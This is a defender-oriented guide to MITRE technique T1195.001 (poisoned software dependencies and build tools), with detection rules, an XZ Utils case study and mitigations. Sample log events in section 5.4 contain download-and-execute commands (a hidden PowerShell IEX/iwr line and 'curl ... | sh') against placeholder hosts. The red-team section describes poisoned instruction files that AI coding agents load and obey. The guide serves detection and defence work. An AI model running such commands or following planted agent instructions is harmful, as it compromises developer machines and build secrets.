MITRE ATT&CK · Initial Access · Sub-technique of T1195

T1195.001 Compromise Software Dependencies and Development Tools

Modern software is mostly assembled, not written. One program can pull hundreds of building blocks written by strangers, plus the tools that glue them together. This sub-technique means an attacker poisons one of those building blocks or tools, so that every product built with it carries the attacker's code from the very first compile.

  • Tactic: Initial Access
  • Platforms: Linux · Windows · macOS
  • Parent: T1195 Supply Chain Compromise
  • ATT&CK since: 11 March 2020 · Version 2.0 (updated 6 October 2026)
  • Detection difficulty: Hard
  • Guide v2.0 · checked against MITRE, October 2026
What it is
A library, package, or build tool is backdoored upstream, and the backdoor flows into everything built on top of it.
Why it is serious
Developers install dependencies automatically and rarely review them; a poisoned part is trusted by every build that pulls it.
Known cases
XZ Utils (2024), Shai-Hulud npm worm (2025), GlassWorm VS Code extensions (2025), event-stream (2018), ua-parser-js (2021), Codecov uploader (2021), dependency confusion wave (2021).
Main defense
Locked, pinned dependencies from an internal mirror; GitHub Actions pinned to commit hashes; maintainer-change monitoring; provenance and SBOM checks.

Contents

    1

    Overview

    This section explains what a dependency is, why poisoning one is so effective, where this fits in an attack, and the facts worth memorizing.

    What the technique is

    A dependency is a piece of software that your software needs in order to run: a compression library, a parser, a time library. A development tool is what builds or moves the code: compilers, build scripts, CI runners, upload helpers. Attackers who compromise either one do not attack your finished product directly. Instead, they make sure that when your product is built, their code is built into it.

    The classic paths are: taking over a maintainer account of a popular open-source package, publishing a lookalike package that a build system picks by mistake (dependency confusion), or backdooring a low-level tool such as a compression library that sits inside critical software like sshd. Newer paths, added by MITRE in the 2026 update of this technique, target the pipeline itself: malicious GitHub Actions that steal the runtime credentials of a build, and poisoned instruction files that IDEs and AI coding agents load and follow, such as tasks.json or agent skill files named SKILL.md.

    Attackers also reuse abandoned packages. When a project disappears, someone can register the same name again and publish malicious versions, and old builds that still ask for that name will happily download them.

    Why it matters

    One poisoned dependency can outrun any number of firewalls, because it is carried by the people who build your software. The XZ Utils case in 2024 is the sharpest example: a malicious change to a compression library nearly gave a remote attacker a hidden door into Linux servers running sshd. It was caught by accident, by one researcher noticing a half-second delay in logins.

    The economics favor the attacker enormously: write one malicious package, and every build server that downloads it runs your code with full access to source code, signing keys, and cloud tokens.

    Where it fits in the attack chain

    Like its parent T1195, this is an Initial Access technique, but the entry point is your build environment rather than a user's desktop. The implant then executes inside your CI, steals secrets, and rides your own trusted release process into production and customers.

    Two words, defined

    Registry: a public download service for packages, like npm for JavaScript or PyPI for Python. Provenance: proof of where a build came from, usually a signed statement about which source and which pipeline produced an artifact. Both words appear throughout this guide.

    Written version of the simulation

    The same eight steps, written out for reading or screen readers.

    1. Join and help. The attacker joins an open-source project under a friendly name and submits small, useful bug fixes for two years. Real work builds real reputation. Defender view: nothing. This is a public community, not your network.
    2. Become the maintainer. The tired lead maintainer, overwhelmed and underfunded, hands commit rights to the helpful contributor. Trust has now been transferred to the attacker. Defender view: nothing, though forge audit logs record the permission change.
    3. Publish the poisoned release. A new version of the library ships with a cleverly hidden addition. It is disabled in the public source and activates only inside certain build products. Defender view: a routine version bump in your dependency feed.
    4. CI pulls it automatically. Your build system sees the new version satisfies its dependency rules and downloads it in the middle of the night. Nobody reviews it. Defender view: a normal package download on a runner. Suspicious only if you compare source and destination hosts.
    5. The backdoor is built in. During linking, the injected code modifies a security-critical binary in the build output. The product's own tests pass. Defender view: still quiet. The artifact looks and installs normally.
    6. Ships to production. The product deploys to thousands of servers, including yours. The hidden door waits for a specific trigger. Defender view: a routine deployment event.
    7. A researcher notices. A developer debugging a slow login finds half a second of unexplained delay and unusual memory use, digs in, and reports a sophisticated backdoor. The public disclosure happens within days. Defender view: external signal arrives; now everyone is hunting.
    8. Rollback and hardening. Versions are reverted, mirrors remove the release, maintainers regain control, and the industry wakes up to maintainer burnout and provenance attestation. Defender view: contained, with permanent lessons about trusting single maintainers.

    Red Team / Hacker Perspective

    Dependencies are the softest target in modern software because they are maintained by individuals, downloaded by machines, and reviewed by almost nobody. This section explains the attacker's options, requirements, and typical mistakes — at the level of ideas and safe lab work only.

    Why attackers use this technique

    • Automation does the delivery. Version ranges and lockfile updates mean CI machines install new releases without a human in the loop.
    • Build runners are full of treasure. Source code, signing keys, cloud credentials, and deploy rights are all present in one place.
    • No victim mistake needed. Nothing at the victim was misconfigured; the code came from the ecosystem everyone uses.
    • Long reach. A popular package turns one attacker into a silent passenger inside thousands of downstream products.

    The five main paths

    1. Maintainer takeover. Months of helpful commits, then a maintainer role, then a poisoned release. Patient and highest quality (XZ Utils, event-stream).
    2. Account hijack. Steal a maintainer's session or password and push a malicious version (ua-parser-js).
    3. Dependency confusion. Publish an internal package name publicly, so misconfigured CI fetches the attacker's copy (the 2021 wave against big tech).
    4. Tool and pipeline compromise. Backdoor a build or release tool so the poison enters during assembly (the Codecov uploader), or plant a malicious CI component. MITRE's 2026 update highlights GitHub Actions: a poisoned Action can read the build's runtime credentials (for example from /proc on Linux) and push more poison into the pipeline. Because Actions often depend on other Actions, one poisoned Action can infect many repositories.
    5. Instruction files for IDEs and AI agents. MITRE's 2026 update also covers project files such as tasks.json, which can run commands when a developer opens or builds a project, and agent skill files (SKILL.md), which an AI coding agent loads and follows with the agent's permissions. Because these are text, not executables, they often pass registry screening and antivirus scanning. Attackers may publish them under friendly names, upload clean copies first and weaponize them later, or hide the malicious instructions in a second document the reviewed file points to.

    What it takes to succeed, and where it applies

    This technique needs three things: a package or tool your target builds with, a way to get a malicious version distributed (a maintainer role, a stolen account, or a registry that accepts the name), and a victim whose builds resolve dependencies automatically. It applies everywhere software is built, which is everywhere. The poisoned code executes with the build runner's privileges: on Linux runners that is typically full access to the job's secrets and sometimes the cluster.

    Attackers optimize for persistence of trust: the poisoned release must look ordinary in diffs, changelogs, and package metadata. The XZ implant hid inside test files and activated only under specific build conditions, which defeated casual review.

    Safe lab exercise: watch a resolver get tricked

    On machines you own, in an offline lab:

    1. Run a private registry (for example a local npm or PyPI mirror in a container) and publish an "internal-only" package there.
    2. Publish a same-named package on a second, public mirror you also host locally.
    3. Install with default resolver settings and log which copy wins; then fix the configuration (registry pinning, lockfiles, --index-url without extra indexes) and watch the behavior change.
    4. Enable verbose resolver logs and push them to a log file; that is the exact telemetry your defensive rules in section 5.5 use.

    You will see that resolver behavior, not malware, decides everything: the attack is a configuration error turned into a breach.

    Common attacker mistakes

    • Breaking the build. A poisoned release that fails tests downstream gets noticed immediately.
    • Loud install scripts. Post-install steps that download and run binaries leave obvious traces in runner logs.
    • Rushing the takeover. A new account asking for commit rights in weeks, not years, gets flagged by the community.
    • Reusing infrastructure. Package publish events from the same IPs as other attacks link campaigns together.

    Variations seen in the wild

    • Protestware and wipers pushed from maintainer accounts, showing how much damage one release can do.
    • Lookalike names (typosquats) of popular packages, harvesting secrets from developer laptops.
    • Compromised action plugins in CI systems, exfiltrating secrets through workflow runs.
    • Signed-but-poisoned tool updates, where the vendor's own release tooling is the entry point.
    • Self-spreading worms in package ecosystems: Shai-Hulud (2025) stole maintainer tokens and used them to publish infected versions of victims' own packages, spreading without a single human attacker.
    • Malicious editor extensions distributed through official marketplaces, such as GlassWorm in Visual Studio Code extensions (2025).
    • Project-file poisoning on macOS: XCSSET added malicious code into developers' Xcode projects, so every app built from them carried the implant.

    Blue Team / SOC Perspective

    Defenders cannot review the whole open-source ecosystem, but they can make their own builds picky and watch the three places a poisoned dependency must pass: the registry download, the runner, and the release. This section shows where to look and how to triage.

    How defenders can see it

    • Forge audit logs. GitHub and GitLab record permission changes, new collaborators, token creation, and webhook edits. Maintainer takeover is visible here before any code changes.
    • Registry and mirror logs. What each runner downloaded, from where, and when. Internal mirrors are your chokepoint: telemetry there covers every build.
    • Runner telemetry. Process creation on build hosts shows install scripts, unexpected interpreters, and outbound connections from builds.
    • SBOM and provenance records. A per-release list of components lets you answer "where do we use X version Y?" in minutes.

    Artifacts it leaves behind

    Forge
    Collaborator grants, protection-rule changes, tokens created by unusual accounts.
    Registry
    A new release by a recently added maintainer; downloads of internal-named packages from public hosts.
    Runner
    Post-install script processes; interpreters spawned by package managers; DNS to unknown hosts.
    Release
    Binary hashes that change with no source change; provenance statements missing or mismatched.

    Where to look first

    • Permission changes on your critical dependencies, both yours and the upstream projects you consume, reviewed weekly.
    • Direct runner-to-public-registry traffic. In a healthy setup, runners only see your mirror; anything else is a finding.
    • Unexplained hash changes between builds of the same source revision.
    • Maintainer health of critical packages: one active maintainer and no corporate backing is a risk flag you can check from public data.

    Why it matters

    In this sub-technique the attacker's code executes in your most trusted automation, with your secrets, and then ships under your signature. A missed dependency poisoning is therefore worse than most endpoint intrusions: it can compromise every customer at once. The controls are cheap compared with the blast radius: pin versions, mirror everything, and log the mirror.

    Short triage flow

    1. Confirm the poisoned component. Which package, which version, which advisory? Store the hashes.
    2. Query your SBOM and lockfiles. Find every product and environment that resolved the bad version, and when.
    3. Check mirror logs. Did your runners download it? From which host, at which times?
    4. Review runner sessions. Look at process and network telemetry for the exact build jobs that pulled the package.
    5. Assume secrets burned. Rotate every credential present in those builds; check cloud audit logs for token use.
    6. Decide on release. Rebuild from a clean pinned version, re-verify provenance, and only then redeploy.

    Watch out

    Do not just delete the package. Deleting removes the evidence that tells you what the implant did inside your build. Snapshot the artifact, the logs, and the runner state first, then remediate.

    Known actors and campaigns

    MITRE lists ten observed examples for this sub-technique. The most useful for defenders:

    • "Jia Tan" (XZ Utils, 2024). Multi-year takeover of a critical project; attribution medium confidence, tradecraft top tier.
    • Shai-Hulud npm worm (2025). Stole maintainer tokens and published infected versions of victims' own packages, so the campaign spread by itself across the npm ecosystem; MITRE tracks a smaller copy, Mini Shai-Hulud.
    • GlassWorm (2025). Spread through Visual Studio Code extensions and GitHub-hosted JavaScript projects.
    • APT38 (G0082). Injected malicious code into npm packages, including copies of Axios and Mastra.
    • ShinyHunters (G1057). Compromised CI/CD pipelines through high-privilege engineering accounts on Git platforms and build services.
    • TeamPCP (G1056). Ran coordinated attacks across the npm, PyPI, VS Code, and Docker ecosystems.
    • BeaverTail. Delivered through npm packages hosted on public code repositories.
    • XCSSET (macOS). Added malicious code into developers' Xcode projects by modifying build files on disk.
    • right9ctrl (event-stream, 2018). Account handover used to target a crypto wallet app.
    • ua-parser-js hijack (2021). Maintainer account compromise delivering miners and stealers.
    • Codecov bash uploader (2021). Tool compromise exfiltrating CI environment variables for months.
    • Dependency confusion researcher wave (2021). Bug bounty actors proving the resolver flaw against major firms.

    Confidence levels, in practice

    High
    Registry confirmed takedown plus advisory plus your mirror logs showing the download. Act immediately.
    Medium
    Single credible report of lookalike behavior. Hunt; do not mass-block yet.
    Low
    Social media rumor of a backdoor. Document, watch, wait for confirmation.

    Package ecosystems generate many rumors; disciplined confidence labeling keeps the SOC calm.

    Applying the intelligence

    1. Map advisories to your lockfiles automatically; manual matching fails at scale.
    2. Track maintainer changes for your critical packages as an intel product in its own right.
    3. Turn campaigns into detections. The XZ story produced the "hash changed without source change" check used in section 5.5.
    4. Feed findings upstream. Reporting a poisoned package protects the whole sector, including you next time.

    5.4 Logs and patterns

    Evidence, fields, normal and suspicious behavior, and one realistic event example per threat. Names are typical but your schema may differ; the mapping notes in 5.5 spell out assumptions.

    TH-1 — Maintainer takeover of a critical package

    Log sources: GitHub audit log (github.audit) for collaborator and permission events; registry publish metadata; your mirror download logs.

    Fields that matter: action, actor, user, repo, created_at, publish version, maintainers_count.

    Normal behavior: collaborator additions follow a pattern: an existing maintainer adds a person with history, often after a linked pull request. Publishes come from long-standing accounts.

    Suspicious behavior: a collaborator with days of history gets write or admin rights on a widely used repo; publish happens from a new device or country right after; the maintainer count drops to one busy account.

    Detection logic: alert on collaborator-added events for repos in your critical-dependency list where the actor's account age is under 90 days, or where the grant and a subsequent publish happen within 24 hours.

    GitHub audit log — new collaborator on critical repo (JSON)
    {"created_at":"2026-01-06T21:40:12Z","action":"repo.add_member",
 "actor":"original-lead","user":"new-helper-2024","permission":"admin",
 "repo":"foundation-org/libtar-core","org":"foundation-org",
 "actor_account_age_days":812,"user_account_age_days":96}

    TH-2 — Dependency confusion at the resolver

    Log sources: proxy logs for runner subnets; internal mirror logs; CI job logs showing the resolved source.

    Fields that matter: proxy src_ip, url_host, url_path; mirror package, version, resolver.

    Normal behavior: runner subnets only ever talk to packages.corp.internal or the mirror host. Public registry traffic from runners is zero in a healthy estate.

    Suspicious behavior: any runner request to registry.npmjs.org, pypi.org, or mirrors you do not own, especially for package names matching your internal naming style.

    Detection logic: alert when a source IP in runner ranges resolves any package from a non-mirror host. For extra fidelity, match the URL path against the internal package name list.

    Proxy log — runner fetching internal-named package publicly (JSON)
    {"ts":"2026-01-08T03:12:44Z","src_ip":"10.20.4.31","subnet":"ci-runners",
 "method":"GET","url_host":"registry.npmjs.org",
 "url_path":"/@corp-utils/paycalc/-/paycalc-3.1.7.tgz",
 "user_agent":"npm/10.2.4 node/v20.11.0 linux x64","action":"allowed",
 "status":200,"bytes_out":41877,"job_name":"billing-worker-build"}

    TH-3 — Build tool fetched from a non-official host

    Log sources: proxy or DNS logs; runner file-integrity and download telemetry; release-engineering download manifests.

    Fields that matter: url_host, url_path, sha256, src_ip, job_name.

    Normal behavior: source tarballs and tool downloads come only from documented project hosts or your mirror, with pinned hashes recorded in scripts.

    Suspicious behavior: a build job downloads xz, zlib, or a compiler toolchain from a personal mirror, a shortened URL, or a host registered recently; the downloaded hash differs from the pinned one.

    Detection logic: alert when the URL host for tool downloads is not on the allowlist, or when the hash of a downloaded tool does not match the pinned value for that version.

    Proxy log — toolchain tarball from an unofficial host (JSON)
    {"ts":"2026-01-09T02:55:10Z","src_ip":"10.20.4.17","subnet":"ci-runners",
 "method":"GET","url_host":"files.fastmirror-cdn.example.net",
 "url_path":"/utils/xz/xz-5.6.0.tar.gz",
 "user_agent":"curl/8.5.0","action":"blocked","status":403,
 "policy":"tool-download-allowlist","job_name":"firmware-nightly"}

    TH-4 — Typosquatted package install script on a developer endpoint

    Log sources: Sysmon Event ID 1 on developer endpoints; package-manager verbose logs; proxy logs.

    Fields that matter: Image, ParentImage, CommandLine, User, Hashes.

    Normal behavior: pip or npm installs produce build output but rarely spawn script hosts immediately after; developer installs come from the internal registry.

    Suspicious behavior: right after an install, the package manager or node spawns powershell, curl, or cmd; the install source is the public registry for a package with a lookalike name.

    Detection logic: process-creation events where the parent is a package manager and the child is a script or download utility, or where the child writes a scheduled task or registry run key.

    Sysmon Event ID 1 — post-install script spawn (JSON)
    {"EventTime":"2026-01-07 16:22:03","EventID":1,"Computer":"DEV-WS-231",
 "User":"CORP\\m.chen",
 "Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
 "CommandLine":"powershell -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocol='Tls12'; IEX(iwr https://cdn-stat-metrics.example.top/a.js -UseB)",
 "ParentImage":"C:\\Python312\\Scripts\\pip.exe",
 "IntegrityLevel":"Medium"}

    TH-5 — Malicious editor extension

    Log sources: Sysmon Event ID 1; extension marketplace audit exports; EDR module-load data.

    Fields that matter: ParentImage (extension host), Image, CommandLine, User.

    Normal behavior: extension hosts spawn language servers, debuggers, and git tools; almost never shells with network commands.

    Suspicious behavior: the extension host process spawning sh, bash, powershell, or curl; new extensions installed by users outside the approved list.

    Detection logic: process-creation events with the editor's extension-host binary as parent and a shell or scripting host as child. Pair with an allowlist check from your extension inventory.

    Sysmon Event ID 1 — extension host spawning shell (JSON)
    {"EventTime":"2026-01-10 11:05:37","EventID":1,"Computer":"dev-lin-118","Provider":"Linux-Sysmon",
 "User":"CORP\\a.ivanov",
 "Image":"/usr/bin/bash",
 "CommandLine":"bash -c curl -s https://updates.plugincdn.example.org/payload | sh",
 "ParentImage":"/usr/share/code/code --type=extensionHost",
 "ExtensionId":"format-hero.autoformat-plus"}

    TH-6 — CI webhook or token exfiltration

    Log sources: GitHub audit log for webhook and token events; egress logs for the runners and forge integrations.

    Fields that matter: action (hook.create, oauth_access.create), actor, repo, url, created_at.

    Normal behavior: webhooks point at your internal CI and chat tools, created by automation accounts. OAuth tokens are requested by reviewed apps only.

    Suspicious behavior: a webhook targeting a personal domain or a paste site; an OAuth grant with broad scopes requested by an unknown app; the same actor creating a webhook minutes after a failed login from a new country.

    Detection logic: alert on hook.create where the target host is not in the approved integration list, and on OAuth grants with repo-read or admin scopes from unreviewed apps.

    GitHub audit log — webhook to external host (JSON)
    {"created_at":"2026-01-11T04:18:55Z","action":"hook.create",
 "actor":"svc-integrations","repo":"foundation-org/libtar-core",
 "hook_url":"https://metrics-collector.webhooks.example.site/ingest",
 "events":["push","pull_request"],"actor_previous_ip":"185.203.116.7",
 "org":"foundation-org"}

    Real-World Case Study: XZ Utils Backdoor (2024)

    The XZ Utils incident is the best-documented example of this sub-technique. A patient attacker spent years earning trust in an open-source project, then nearly installed a remote-access door into the secure shell service of Linux distributions worldwide. It was caught by one curious researcher, weeks before wide distribution.

    Context

    XZ Utils is the open-source implementation of the .xz compression format, a dependency of systemd and therefore of sshd on many mainstream Linux distributions. Its single long-time maintainer was exhausted and underfunded, a well-known weakness of critical open-source infrastructure. Into that gap stepped a contributor eventually known by the name "Jia Tan".

    The backdoor in one paragraph

    Malicious files were hidden in the release tarballs (not in the public repository), and build files were changed so the injection happened at build time. The result, known as CVE-2024-3094, modified the way sshd links against liblzma on certain x86-64 Linux systems, letting a remote attacker execute commands through crafted requests before authentication. The code activated only on Debian and RPM-based builds, which avoided fuzzing rigs and reduced the chance of discovery.

    Timeline

    1. 2021 – 2023The long game. Accounts linked to the operation contribute genuinely useful patches to the project. A pressure campaign, including bogus bug reports about slow maintenance, wears down the original maintainer, who hands over increasing responsibility.
    2. February – March 2024Poisoned releases. XZ 5.6.0 (24 February) and 5.6.1 (9 March) ship with the hidden build-time injection. Downstream development and rolling-release branches begin packaging them; stable distributions mostly do not.
    3. 29 March 2024Discovery. Developer Andres Freund, debugging a half-second delay in SSH logins on his own systems, notices unusual memory use in sshd, traces it to liblzma, and reports the finding to the distribution security lists.
    4. 29 – 31 March 2024Public response. The backdoor is disclosed as CVE-2024-3094 with CVSS 10.0. Distributions revert to XZ 5.4.x, mirrors pull the poisoned releases, and CISA publishes an alert on 29 March recommending a downgrade to a clean version such as 5.4.6.
    5. 2024 onwardIndustry wake-up. Maintainer burnout, tarball-versus-repo integrity, and provenance attestation become major topics across the software industry.

    Attack chain

    • Trust building in the project
    • →
    • Maintainer role acquired
    • →
    • Poisoned tarball release (T1195.001)
    • →
    • Distributions build it
    • →
    • Backdoored sshd deployed
    • →
    • Researcher catches the anomaly

    Detection point

    The save did not come from an alert rule; it came from a human noticing a performance anomaly and refusing to ignore it. Post-incident, defenders identified the signals that would have worked:

    • Maintainer-role changes on critical projects (forge audit telemetry).
    • Binary hashes that changed between builds of the same source.
    • Differences between repository source and release tarballs.
    • Unusual sshd latency or memory patterns as a fleet-wide anomaly.

    Takeaway

    Curiosity plus baseline awareness beat a CVSS-10 backdoor. Fleet-wide performance baselines are detections too.

    Containment, eradication, recovery

    Containment: distributions froze at XZ 5.4.x, mirrors removed 5.6.0 and 5.6.1, and maintainers disabled the project release pipeline pending review. Organizations triaged whether their images had built the affected versions.

    Eradication: systems that had built 5.6.x rebuilt sshd and related packages from clean sources. Because the backdoor executed pre-authentication, teams treated exposed SSH endpoints as potentially accessed and reviewed auth logs for anomalies.

    Recovery: the project's infrastructure was handed to new maintainers, build processes gained reproducibility checks, and the ecosystem pushed provenance attestation forward.

    Impact

    Narrow, by luck and timing: mainstream distributions had mostly not shipped 5.6.x to stable releases when it was caught. The ceiling, however, was enormous: pre-authentication remote code execution as root on millions of servers. The near-miss made it one of the most discussed supply chain cases ever.

    Team response and communication

    The response model worked because it was open: the researcher reported privately to distribution security teams, disclosure happened within days, and coordinated advisories with version pins and rebuild instructions followed immediately. Organizations with SBOMs scoped their exposure in hours; those without spent days rebuilding everything.

    Lessons learned

    • Single-maintainer critical packages are a supply chain risk; fund them or reduce dependence.
    • Release artifacts and repository source must match; verify tarball builds reproducibly.
    • Trust must be earned slowly and revocable quickly; gate release rights.
    • Fleet baselines catch what signatures never will.
    • Dependency freezing is a legitimate, fast containment move.

    Mitigation and Defense

    The theme of dependency defense is reduce trust surface: fewer components, known maintainers, pinned versions, one mirror, and provenance you can verify. Enterprise and home guidance below, then a prioritized action list.

    ATT&CK mitigation mapping

    MITRE lists four official mitigations for T1195.001. They map to the controls below like this:

    • M1013 Application Developer Guidance — choose third-party libraries carefully, lock dependency versions, and pin GitHub Actions to a full commit hash instead of a tag or branch.
    • M1033 Limit Software Installation — pull packages from internal repositories that hold verified, approved copies.
    • M1051 Update Software — patch process that also reviews unused, abandoned, or unmaintained dependencies.
    • M1016 Vulnerability Scanning — continuous monitoring plus automated and manual code review of components.

    Enterprise: policy and intake

    • Dependency policy. Every build resolves from the internal mirror only; direct public registry access from runners is blocked.
    • Critical package list. Maintain a reviewed list of the packages your products truly depend on, with named internal owners.
    • Intake checks. New dependencies need package age, maintainer count, and download history reviewed before approval.

    Enterprise: identity and forge

    • Phishing-resistant MFA on forge and registry accounts; hardware keys for release maintainers.
    • Audit-log streaming from GitHub/GitLab into the SIEM, wired to the section 5.5 rules.
    • Branch protection and release rights reviewed quarterly; no single account can publish a release alone.

    Enterprise: build and release

    • Lockfiles and pinned hashes everywhere; version ranges are only allowed inside the mirror.
    • Reproducible builds where feasible; at minimum, hash-compare artifacts across two independent builds.
    • Provenance attestation (for example SLSA-style statements) attached to every release.

    Enterprise: monitoring and response

    • Runner telemetry: process creation, DNS, and egress from build hosts are logged and alerted.
    • SBOM per release so exposure to a poisoned component is a database query, not an archaeology project.
    • Freeze-and-rebuild playbook: pin to last-known-good, rotate CI secrets, rebuild, and verify provenance before shipping.

    Home and small office

    • Install software from official stores and vendor sites; avoid random download mirrors.
    • Keep developer tools updated from their own built-in updaters.
    • If you tinker with code, use dependency scanning tools before running unfamiliar projects.
    • Use a separate user account, or better a virtual machine, for testing unknown software.
    • Turn on automatic OS updates; most home exposure ends there.

    Verifying the controls work

    • Attempt a public-registry fetch from a runner subnet; it must be blocked and logged.
    • Build a project twice from the same commit; hashes must match or the difference must be explained.
    • Trigger the forge-audit rules in a test repo; the SOC must page the right owner.

    Cheat Sheet and Quick Reference

    The compressed version of this guide for the next advisory or the next hunting session.

    Key facts

    Technique
    T1195.001 Compromise Software Dependencies and Development Tools (Initial Access) · ATT&CK version 2.0, created 11 March 2020, last modified 6 October 2026
    Platforms
    Linux · Windows · macOS
    Core idea
    Poison an ingredient or tool; the build system installs it for the attacker
    Entry points
    Maintainer takeover, account hijack, dependency confusion, tool and CI compromise, poisoned IDE or AI-agent instruction files
    Where it executes
    Build runners and developer endpoints first, then your products
    Best signals
    Forge permission changes, runner-to-public-registry traffic, post-install script execution, hash drift
    Best prep
    Locked mirror, forge audit streaming, SBOMs, provenance, freeze-and-rebuild playbook

    Top detections

    • Collaborator or admin grant on a critical repo from a young account (TH-1 rule).
    • Runner subnet fetching from a public registry (TH-2 rule).
    • Toolchain archive downloaded from a non-official host (TH-3 rule).
    • Package manager spawning a shell or downloader (TH-4 rule).
    • Editor extension host spawning a shell (TH-5 rule).
    • Webhook created to a non-approved host (TH-6 rule).

    Response checklist

    • Identify the poisoned component, version, and hashes; capture a sample before removal.
    • Query SBOMs and lockfiles for every consumer of that component and version.
    • Pull mirror logs: which runners downloaded it, and when.
    • Review process, DNS, and egress telemetry for those exact build jobs.
    • Treat CI secrets as burned: rotate tokens, keys, and cloud credentials.
    • Check cloud and forge audit logs for use of those credentials.
    • Freeze to last-known-good; rebuild from clean, pinned sources.
    • Verify provenance of the rebuilt artifacts before shipping.
    • Report the package to the registry and ecosystem channels.
    • Feed the timeline and new detections back into this guide.
